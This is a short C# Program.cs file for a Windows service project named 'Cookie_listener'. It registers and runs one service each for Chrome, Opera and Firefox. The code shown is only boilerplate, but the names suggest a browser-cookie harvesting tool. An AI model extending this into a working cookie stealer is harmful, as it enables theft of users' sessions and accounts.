using System.ServiceProcess;

namespace Cookie_listener
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new Service_fo_chrome(),
                new Service_fo_Opera(),
                new Service_fo_FireFox()
            };
            ServiceBase.Run(ServicesToRun);
        }
    }
}
